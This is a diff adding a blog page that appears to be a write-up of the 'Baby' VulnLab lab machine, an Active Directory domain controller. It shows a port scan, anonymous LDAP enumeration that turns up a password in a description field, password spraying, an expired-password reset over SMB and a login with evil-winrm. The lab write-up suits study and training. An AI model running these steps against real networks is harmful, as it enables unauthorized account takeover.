@@ -1,0 +1,374 @@
+<!DOCTYPE html>
+<html class="" lang="en"><head>
+    
+    <meta name="viewport" content="width=device-width" />
+    <meta http-equiv="Content-Type" content="text/html;charset=UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=7" />
+
+    <link
+    rel="icon"
+    href='/favicon.png'
+/>
+<link
+    rel="shortcut icon"
+    href='/favicon.ico'
+    type="image/x-icon"
+/>
+<link
+    rel="apple-touch-icon"
+    href='/apple-touch-icon.png'
+/>
+
+    <link
+        rel="icon"
+        href='/logo.svg'
+        type="image/svg+xml"
+    />
+
+<title>
+        
+            Baby VulnLab  &ndash;
+        
+        chr0ll0x0
+    </title>
+
+    
+    <link href="/symbols-nerd-font/symbols-nerd-font.css" rel="stylesheet" integrity="sha512-lydow8GLOLlYNOtHlksNCmGWWCBsbIEtikXpHzfWqx78HLlyQZHOzyLwPpKol4Th6aCwLUXOfODVYgwrd3nwKQ=="/>
+    <link href="/jetbrains-mono/jetbrains-mono.css" rel="stylesheet" integrity="sha512-tJxlgL6v1Y7kFf+qB8SloaAMKnOAw6WouknxXtIjkBux9Y/9aX81EUWOJO8c/3l98DmjG8brr4to7zaez606Fg=="/>
+
+    
+    
+    <link type="text/css" rel="stylesheet" href=https://chr0ll0x0.github.io/css/styles.c928edc0eba1b83ff1c6bfac475f42cca75f1d3970d6d594d2752af04d870a4b33adc7c5b9db020a5ae5ccc17ff0d127cab7af3d937912f09f5491c26e8596a8.css integrity="sha512-ySjtwOuhuD/xxr&#43;sR19CzKdfHTlw1tWU0nUq8E2HCkszrcfFudsCClrlzMF/8NEnyrevPZN5EvCfVJHCboWWqA==" />
+<meta name="author" content="Gabriele Musco" />
+
+    
+    
+        <meta name="description" content="ne information Hostname: BabyDC.baby.vl Domain: baby Os: Windows Difficulty: Easy
+Rustscan Scan rustscan -a 10.10.109.97 -- -sV Open 10.10.109.97:53 Open 10.10.109.97:88 Open 10.10.109.97:135 Open 10.10.109.97:139 Open 10.10.109.97:389 Open 10.10.109.97:445 Open 10.10.109.97:464 Open 10.10.109.97:593 Open 10.10.109.97:636 Open 10.10.109.97:3269 Open 10.10.109.97:3268 Open 10.10.109.97:3389 Open 10.10.109.97:5357 Open 10.10.109.97:5985 Open 10.10.109.97:9389 Open 10.10.109.97:49664 Open 10.10.109.97:49667 Open 10.10.109.97:49668 Open 10.10.109.97:49674 Open 10.10.109.97:49675 Open 10.10.109.97:49838 Open 10.10.109.97:54940 PORT STATE SERVICE REASON VERSION 53/tcp open domain syn-ack Simple DNS Plus 88/tcp open kerberos-sec syn-ack Microsoft Windows Kerberos 135/tcp open msrpc syn-ack Microsoft Windows RPC 139/tcp open netbios-ssn syn-ack Microsoft Windows netbios-ssn 389/tcp open ldap syn-ack Microsoft Windows Active Directory LDAP (Domain: baby." />
+    
+
+<meta property="og:site_name"
+    content='chr0ll0x0' />
+
+    <meta property="og:title" content="Baby VulnLab" />
+    <meta property="og:type" content="article" />
+    
+    <meta
+        property="article:author" content="Gabriele Musco" />
+    <meta
+        property="article:published_time"
+        content='2023-11-04T21:05:44Z&#43;0100' />
+    
+    <meta property="og:url" content="https://chr0ll0x0.github.io/posts/baby-vuln/" />
+    
+    
+    <meta property="og:image"
+        content="https://chr0ll0x0.github.io/icon512.png" />
+    
+        <meta property="og:description" content="Baby (VulnLab) Machine information Hostname: BabyDC.baby.vl Domain: baby Os: Windows Difficulty: Easy
+Rustscan Scan rustscan -a 10.10.109.97 -- -sV Open 10.10.1" />
+    
+
+<meta name="twitter:card" content="summary_large_image" />
+<meta property="twitter:domain"
+      content='chr0ll0x0.github.io'
+/>
+<meta property="twitter:url" content="https://chr0ll0x0.github.io/posts/baby-vuln/" />
+
+
+    <meta name="twitter:title" content="Baby VulnLab" />
+    
+    
+    
+    <meta name="twitter:image"
+        content="https://chr0ll0x0.github.io/icon512.png" />
+    
+        <meta name="twitter:description" content="Baby (VulnLab) Machine information Hostname: BabyDC.baby.vl Domain: baby Os: Windows Difficulty: Easy
+Rustscan Scan rustscan -a 10.10.109.97 -- -sV Open 10.10.1" />
+    
+
+<link rel="manifest" href="/manifest/index.json" />
+</head>
+
+
+<body>
+        <div id="baseContainer"><header class="">
+<div class="titleAndSearchContainer">
+        <div id="titleContainer">
+            
+                <a class="unstyledLink" href="/">
+                    <img src='/logo.svg' alt='Logo'/>
+                </a>
+            
+            <div class="rightOfLogo">
+                <div class="titleAndHamburger">
+                    <h1>
+                        <a class="unstyledLink" href="/">chr0ll0x0</a>
+                        
+                    </h1>
+                    
+                </div>
+                <div id="wide_nav"><nav>
+    
+    <ul id="main-nav">
+        <li><a href="/">Home</a></li>
+        
+            <li><a href="/posts">Posts</a></li>
+        
+        
+        
+        
+        
+        
+            <li><a href="/about/">About</a></li>
+        
+        
+        
+    </ul>
+</nav>
+</div>
+            </div>
+        </div>
+        <div class="search">
+    <input id="searchbar" type="text" placeholder='Search' />
+    <span class="nerdlink" onclick="newSearch();">&#xf002;</span>
+</div>
+<script>
+    function newSearch() {
+        let term = searchbar.value.trim();
+        if (!term) return;
+        location.href = `/search?q=${term}`;
+    }
+    searchbar.onkeyup = (ev) => {if (ev.keyCode == 13) newSearch()};
+</script>
+
+    </div>
+    <div id="links">
+        
+        
+        <a
+    
+        rel="noreferrer"
+    
+    target="_blank"
+    class="nerdlink"
+    href="https://github.com/chr0ll0x0">
+    
+    
+        &#xf09b;
+    
+    <span>
+        GitHub
+    </span>
+</a>
+<a
+    
+        rel="noreferrer"
+    
+    target="_blank"
+    class="nerdlink"
+    href="https://twitter.com/chr0ll0x0">
+    
+    
+        &#xf099;
+    
+    <span>
+        Twitter
+    </span>
+</a>
+
+    </div>
+    
+
+</header>
+<div id="contentContainer">
+                <div id="content">
+                    <main>
+<article class="card single">
+    
+        <h1>Baby VulnLab</h1>
+    
+    
+        <p class="date">
+            <span title='Date'> </span>
+    2023-11-04
+
+</p>
+    
+    
+    
+    
+    <div><h1 id="baby-vulnlab">Baby (VulnLab)</h1>
+<p><img src="https://cdn.discordapp.com/attachments/909723295379750982/1097079082753200149/baby_slide.png" alt="N|Solid"></p>
+<h2 id="machine-information">Machine information</h2>
+<p>Hostname: BabyDC.baby.vl
+Domain: baby
+Os: Windows
+Difficulty: Easy</p>
+<h2 id="rustscan-scan">Rustscan Scan</h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>rustscan -a 10.10.109.97 -- -sV
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Open 10.10.109.97:53
+</span></span><span style="display:flex;"><span>Open 10.10.109.97:88
+</span></span><span style="display:flex;"><span>Open 10.10.109.97:135
+</span></span><span style="display:flex;"><span>Open 10.10.109.97:139
+</span></span><span style="display:flex;"><span>Open 10.10.109.97:389
+</span></span><span style="display:flex;"><span>Open 10.10.109.97:445
+</span></span><span style="display:flex;"><span>Open 10.10.109.97:464
+</span></span><span style="display:flex;"><span>Open 10.10.109.97:593
+</span></span><span style="display:flex;"><span>Open 10.10.109.97:636
+</span></span><span style="display:flex;"><span>Open 10.10.109.97:3269
+</span></span><span style="display:flex;"><span>Open 10.10.109.97:3268
+</span></span><span style="display:flex;"><span>Open 10.10.109.97:3389
+</span></span><span style="display:flex;"><span>Open 10.10.109.97:5357
+</span></span><span style="display:flex;"><span>Open 10.10.109.97:5985
+</span></span><span style="display:flex;"><span>Open 10.10.109.97:9389
+</span></span><span style="display:flex;"><span>Open 10.10.109.97:49664
+</span></span><span style="display:flex;"><span>Open 10.10.109.97:49667
+</span></span><span style="display:flex;"><span>Open 10.10.109.97:49668
+</span></span><span style="display:flex;"><span>Open 10.10.109.97:49674
+</span></span><span style="display:flex;"><span>Open 10.10.109.97:49675
+</span></span><span style="display:flex;"><span>Open 10.10.109.97:49838
+</span></span><span style="display:flex;"><span>Open 10.10.109.97:54940
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>PORT      STATE    SERVICE       REASON      VERSION
+</span></span><span style="display:flex;"><span>53/tcp    open     domain        syn-ack     Simple DNS Plus
+</span></span><span style="display:flex;"><span>88/tcp    open     kerberos-sec  syn-ack     Microsoft Windows Kerberos 
+</span></span><span style="display:flex;"><span>135/tcp   open     msrpc         syn-ack     Microsoft Windows RPC
+</span></span><span style="display:flex;"><span>139/tcp   open     netbios-ssn   syn-ack     Microsoft Windows netbios-ssn
+</span></span><span style="display:flex;"><span>389/tcp   open     ldap          syn-ack     Microsoft Windows Active Directory LDAP <span style="color:#f92672">(</span>Domain: baby.vl0., Site: Default-First-Site-Name<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>445/tcp   open     microsoft-ds? syn-ack
+</span></span><span style="display:flex;"><span>464/tcp   open     kpasswd5?     syn-ack
+</span></span><span style="display:flex;"><span>593/tcp   open     ncacn_http    syn-ack     Microsoft Windows RPC over HTTP 1.0
+</span></span><span style="display:flex;"><span>636/tcp   open     tcpwrapped    syn-ack
+</span></span><span style="display:flex;"><span>3268/tcp  open     ldap          syn-ack     Microsoft Windows Active Directory LDAP <span style="color:#f92672">(</span>Domain: baby.vl0., Site: Default-First-Site-Name<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>3269/tcp  open     tcpwrapped    syn-ack
+</span></span><span style="display:flex;"><span>3389/tcp  open     ms-wbt-server syn-ack     Microsoft Terminal Services
+</span></span><span style="display:flex;"><span>5357/tcp  filtered wsdapi        no-response
+</span></span><span style="display:flex;"><span>5985/tcp  open     http          syn-ack     Microsoft HTTPAPI httpd 2.0 <span style="color:#f92672">(</span>SSDP/UPnP<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>9389/tcp  open     mc-nmf        syn-ack     .NET Message Framing
+</span></span><span style="display:flex;"><span>49664/tcp open     msrpc         syn-ack     Microsoft Windows RPC
+</span></span><span style="display:flex;"><span>49667/tcp open     msrpc         syn-ack     Microsoft Windows RPC
+</span></span><span style="display:flex;"><span>49668/tcp open     msrpc         syn-ack     Microsoft Windows RPC
+</span></span><span style="display:flex;"><span>49674/tcp open     ncacn_http    syn-ack     Microsoft Windows RPC over HTTP 1.0
+</span></span><span style="display:flex;"><span>49675/tcp open     msrpc         syn-ack     Microsoft Windows RPC
+</span></span><span style="display:flex;"><span>49838/tcp open     msrpc         syn-ack     Microsoft Windows RPC
+</span></span><span style="display:flex;"><span>54940/tcp open     msrpc         syn-ack     Microsoft Windows RPC
+</span></span></code></pre></div><p>enumerated all interested ports but i found ldap without authentication, let&rsquo;s use <a href="https://viperone.gitbook.io/pentest-everything/everything/ports/ldap#ldapsearch">==ldapsearch==</a>  to enumerate the domain with blank credentials</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>ldapsearch -H ldap://10.10.109.97 -x -b <span style="color:#e6db74">&#39;DC=baby,DC=vl&#39;</span>
+</span></span></code></pre></div><p>when i read the output result, in the last lines found the password for user Teresa Bell on Description.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>dn: CN<span style="color:#f92672">=</span>Teresa Bell,OU<span style="color:#f92672">=</span>it,DC<span style="color:#f92672">=</span>baby,DC<span style="color:#f92672">=</span>vl
+</span></span><span style="display:flex;"><span>objectClass: top
+</span></span><span style="display:flex;"><span>objectClass: person
+</span></span><span style="display:flex;"><span>objectClass: organizationalPerson
+</span></span><span style="display:flex;"><span>objectClass: user
+</span></span><span style="display:flex;"><span>cn: Teresa Bell
+</span></span><span style="display:flex;"><span>sn: Bell
+</span></span><span style="display:flex;"><span>description: Set initial password to *********
+</span></span><span style="display:flex;"><span>givenName: Teresa
+</span></span><span style="display:flex;"><span>distinguishedName: CN<span style="color:#f92672">=</span>Teresa Bell,OU<span style="color:#f92672">=</span>it,DC<span style="color:#f92672">=</span>baby,DC<span style="color:#f92672">=</span>vl
+</span></span><span style="display:flex;"><span>instanceType: <span style="color:#ae81ff">4</span>
+</span></span><span style="display:flex;"><span>whenCreated: 20211121151108.0Z
+</span></span><span style="display:flex;"><span>whenChanged: 20211121151437.0Z
+</span></span><span style="display:flex;"><span>displayName: Teresa Bell
+</span></span><span style="display:flex;"><span>uSNCreated: <span style="color:#ae81ff">12889</span>
+</span></span><span style="display:flex;"><span>memberOf: CN<span style="color:#f92672">=</span>it,CN<span style="color:#f92672">=</span>Users,DC<span style="color:#f92672">=</span>baby,DC<span style="color:#f92672">=</span>vl
+</span></span><span style="display:flex;"><span>uSNChanged: <span style="color:#ae81ff">12905</span>
+</span></span><span style="display:flex;"><span>name: Teresa Bell
+</span></span><span style="display:flex;"><span>objectGUID:: EDGXW4JjgEq7+GuyHBu3QQ<span style="color:#f92672">==</span>
+</span></span><span style="display:flex;"><span>userAccountControl: <span style="color:#ae81ff">66080</span>
+</span></span><span style="display:flex;"><span>badPwdCount: <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span>codePage: <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span>countryCode: <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span>badPasswordTime: <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span>lastLogoff: <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span>lastLogon: <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span>pwdLastSet: <span style="color:#ae81ff">132819812778759642</span>
+</span></span><span style="display:flex;"><span>primaryGroupID: <span style="color:#ae81ff">513</span>
+</span></span><span style="display:flex;"><span>objectSid:: AQUAAAAAAAUVAAAAf1veU67Ze+7mkhtWWgQAAA<span style="color:#f92672">==</span>
+</span></span><span style="display:flex;"><span>accountExpires: <span style="color:#ae81ff">9223372036854775807</span>
+</span></span><span style="display:flex;"><span>logonCount: <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span>sAMAccountName: Teresa.Bell
+</span></span><span style="display:flex;"><span>sAMAccountType: <span style="color:#ae81ff">805306368</span>
+</span></span><span style="display:flex;"><span>userPrincipalName: Teresa.Bell@baby.vl
+</span></span><span style="display:flex;"><span>objectCategory: CN<span style="color:#f92672">=</span>Person,CN<span style="color:#f92672">=</span>Schema,CN<span style="color:#f92672">=</span>Configuration,DC<span style="color:#f92672">=</span>baby,DC<span style="color:#f92672">=</span>vl
+</span></span><span style="display:flex;"><span>dSCorePropagationData: 20211121163014.0Z
+</span></span><span style="display:flex;"><span>dSCorePropagationData: 20211121162927.0Z
+</span></span><span style="display:flex;"><span>dSCorePropagationData: 16010101000416.0Z
+</span></span><span style="display:flex;"><span>msDS-SupportedEncryptionTypes: <span style="color:#ae81ff">0</span>
+</span></span></code></pre></div><p>Let&rsquo;s try to Test creds on smb or ldap ==teresa.bell:********== password was not working for this user.
+<img src="https://cdn.discordapp.com/attachments/1170410199253786674/1170417646878073014/Screenshot_2023-11-04_at_18.39.13.png" alt="alt text">
+However those don&rsquo;t seem to be the correct credentials for that user, but we can Test this password associated with another account. First let&rsquo;s retrieve all users from ldap.
+<code>ldapsearch -H ldap://10.10.109.97 -x -b 'DC=baby,DC=vl'  | grep userPrincipalName | cut -d &quot; &quot; -f2 | cut -d '@' -f1</code>
+<img src="https://cdn.discordapp.com/attachments/1170410199253786674/1170413456520921168/Screenshot_2023-11-04_at_18.25.04.png" alt="alt text">
+Save this result as users.</p>
+<h1 id="users">Users</h1>
+<pre tabindex="0"><code>Jacqueline.Barnett
+Ashley.Webb
+Hugh.George
+Leonard.Dyer
+Connor.Wilkinson
+Joseph.Hughes
+Kerry.Wilson
+Teresa.Bell
+</code></pre><p><a href="https://viperone.gitbook.io/pentest-everything/everything/everything-active-directory/credential-access/brute-force/password-spraying">==Password spray==</a>
+So our next plan is to create file with the usernames and try them.
+<img src="https://cdn.discordapp.com/attachments/1170410199253786674/1170418915667607613/Screenshot_2023-11-04_at_18.45.30.png" alt="alt text">
+However, I tried password spray, but didn&rsquo;t work. Lets see what&rsquo;s wrong, When I returned to result of ldapsearch, I noticed the user was missing, but when i grep with distinguished name (usually just shortened to &lsquo;DN&rsquo;), and match first userlist with second userlist, found interesting users.
+<code>ldapsearch -H ldap://10.10.72.85 -x -b 'DC=baby,DC=vl'  | grep &quot;dn&quot; | cut -d &quot;=&quot;  -f2 | cut -d &quot;,&quot; -f1 | tail | tr &quot; &quot; . |tee users2</code></p>
+<p><code>diff users1.txt users2.txt</code>
+<img src="https://cdn.discordapp.com/attachments/1170410199253786674/1170442816611168276/Screenshot_2023-11-04_at_20.21.40.png" alt="alt text"></p>
+<pre tabindex="0"><code>Ian.Walker
+Caroline.Robinson
+</code></pre><p>Let&rsquo;s add this users to userlist and try again.
+<img src="https://cdn.discordapp.com/attachments/1170410199253786674/1170447020482371644/Screenshot_2023-11-04_at_20.34.00.png" alt="alt text">
+B0000M, We can see an account <code>Caroline.Robinson</code> whose password must be changed.</p>
+<h1 id="change-password-over-smb">Change Password over SMB</h1>
+<p>There is a user <code>Caroline.Robinson</code> with an expired password <code>******</code>. When trying to connect to an SMB we see <a href="https://www.n00py.io/2021/09/resetting-expired-passwords-remotely">==STATUS_PASSWORD_MUST_CHANGE==</a>, error is raised.
+One way to get out of this situation remotely from Linux is to use this ==smbpasswd== tool.
+<img src="https://cdn.discordapp.com/attachments/1170410199253786674/1170452065953263736/Screenshot_2023-11-04_at_20.58.11.png" alt="alt text">
+after that, we just need to log in to the machine using <code>evil-winrm</code>.
+<img src="https://cdn.discordapp.com/attachments/1170410199253786674/1170453366736961716/Screenshot_2023-11-04_at_21.02.42.png" alt="alt text"></p>
+</div>
+</article>
+
+
+
+
+
+
+                    </main><footer>
+    <hr />
+
+<p><small>
+        2023 &copy; 
+    </small></p>
+    <p><small>
+        
+    </small></p>
+</footer>
+</div>
+            </div>
+        </div>
+    
+        <script
+            async
+            defer
+            data-domain="example.com"
+            src="https://something.com/..."
+        ></script>
+    
+
+
+    
+        <script
+            async
+            defer
+            data-website-id="example-tracking-code"
+            src="https://something.com/..."
+        ></script>
+    
+
+
+</body>
+</html>
